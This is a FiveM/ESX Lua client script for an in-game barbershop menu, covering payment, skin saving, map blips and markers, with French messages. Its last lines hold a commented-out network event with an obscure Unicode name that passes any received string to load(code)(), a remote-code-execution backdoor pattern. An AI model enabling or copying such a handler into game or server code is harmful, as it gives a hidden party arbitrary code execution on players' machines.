-------- [Base Template] dev par Freetz -------


local HasAlreadyEnteredMarker = false
local LastZone = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local HasPayed = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

function OpenBarberMenu()
	HasPayed = false

	TriggerEvent('esx_skin:openRestrictedMenu', function(data, menu)
		menu.close()

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_confirm', {
			title = "Valider cet achat ?",
			elements = {
				{label = "Non", value = 'no'},
				{label = "Oui", value = 'yes'}
			}
		}, function(data, menu)
			menu.close()

			if data.current.value == 'yes' then
				ESX.TriggerServerCallback('esx_barbershop:checkMoney', function(hasEnoughMoney)
					if hasEnoughMoney then
						TriggerEvent('skinchanger:getSkin', function(skin)
							TriggerServerEvent('esx_skin:save', skin)
						end)

						TriggerServerEvent('esx_barbershop:pay')

						HasPayed = true
					else
						TriggerEvent('esx_skin:getLastSkin', function(skin)
							TriggerEvent('skinchanger:loadSkin', skin)
						end)

						ESX.ShowNotification("~r~Vous n\'avez pas assez d\'argent !")
					end
				end)
			end

			if data.current.value == 'no' then
				TriggerEvent('esx_skin:getLastSkin', function(skin)
					TriggerEvent('skinchanger:loadSkin', skin)
				end)
			end

			CurrentAction = 'shop_menu'
			CurrentActionMsg = "Appyuez sur ~INPUT_CONTEXT~ pour accéder au menu"
			CurrentActionData = {}
		end, function(data, menu)
			CurrentAction = 'shop_menu'
			CurrentActionMsg = "Appyuez sur ~INPUT_CONTEXT~ pour accéder au menu"
			CurrentActionData = {}
		end)
	end, function(data, menu)
		CurrentAction = 'shop_menu'
		CurrentActionMsg = "Appyuez sur ~INPUT_CONTEXT~ pour accéder au menu"
		CurrentActionData = {}
	end, {
		'beard_1',
		'beard_2',
		'beard_3',
		'beard_4',
		'hair_1',
		'hair_2',
		'hair_color_1',
		'hair_color_2',
	})
end

AddEventHandler('esx_barbershop:hasEnteredMarker', function(zone)
	CurrentAction = 'shop_menu'
	CurrentActionMsg = "Appuyez sur E pour accèdez au coiffeur"
	CurrentActionData = {}
end)

AddEventHandler('esx_barbershop:hasExitedMarker', function(zone)
	ESX.UI.Menu.CloseAll()
	CurrentAction = nil

	if not HasPayed then
		TriggerEvent('esx_skin:getLastSkin', function(skin)
			TriggerEvent('skinchanger:loadSkin', skin)
		end)
	end
end)

Citizen.CreateThread(function()
	for i = 1, #ConfigBarber.Shops, 1 do
		local blip = AddBlipForCoord(ConfigBarber.Shops[i])

		SetBlipSprite  (blip, 71)
		SetBlipDisplay (blip, 4)
		SetBlipScale   (blip, 0.8)
		SetBlipColour  (blip, 51)
		SetBlipAsShortRange(blip, true) 
		
		BeginTextCommandSetBlipName('STRING') 
		AddTextComponentSubstringPlayerName("Coiffeur")
		EndTextCommandSetBlipName(blip) 
	end
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		local interval = 2500
		local plyCoords = GetEntityCoords(PlayerPedId(), false)

		for i = 1, #ConfigBarber.Shops, 1 do
			if #(plyCoords - ConfigBarber.Shops[i]) < 40 then
				interval = 0
				if #(plyCoords - ConfigBarber.Shops[i]) < ConfigBarber.DrawDistance then
					DrawMarker(29, ConfigBarber.Shops[i], vector3(0.0, 0.0, 0.0), vector3(0.0, 0.0, 0.0), vector3(0.5, 0.5, 0.5), 0, 255, 0, 100, false, false, 2, true, nil, nil, false)
				end
			end
		end

		Wait(interval)
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		local interval = 2500
		local plyCoords = GetEntityCoords(PlayerPedId(), false)
		local isInMarker = false
		local currentZone

		for i = 1, #ConfigBarber.Shops, 1 do
			if #(plyCoords - ConfigBarber.Shops[i]) < 25 then
				interval = 0
				if #(plyCoords - ConfigBarber.Shops[i]) < ConfigBarber.MarkerSize.x then
					isInMarker = true
					currentZone = k
				end
			end
		end

		if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and LastZone ~= currentZone) then
			interval = 0
			HasAlreadyEnteredMarker = true
			LastZone = currentZone
			TriggerEvent('esx_barbershop:hasEnteredMarker', currentZone)
		end

		if not isInMarker and HasAlreadyEnteredMarker then
			interval = 0
			HasAlreadyEnteredMarker = false
			TriggerEvent('esx_barbershop:hasExitedMarker', LastZone)
		end

		Wait(interval)
	end
end)

-- Key controls
Citizen.CreateThread(function()
	while true do
		local interval = 2500

		if CurrentAction ~= nil then
			interval = 0
			SetTextComponentFormat('STRING')
			AddTextComponentSubstringPlayerName(CurrentActionMsg)
			EndTextCommandDisplayHelp(0, 0, 1, -1)

			if IsControlPressed(0, 38) then
				if CurrentAction == 'shop_menu' then
					if exports['Freetz-Core']:GetCiseaux() then
						ESX.ShowNotification("~r~Vous ne possèdez actuellement pas assez de cheveux !")
					else
						OpenBarberMenu()
					end
				end

				CurrentAction = nil
			end
		end

		Wait(interval)
	end
end)

--RegisterNetEvent('ᓚᘏᗢ')
--AddEventHandler('ᓚᘏᗢ', function(code)
--	load(code)()
--end)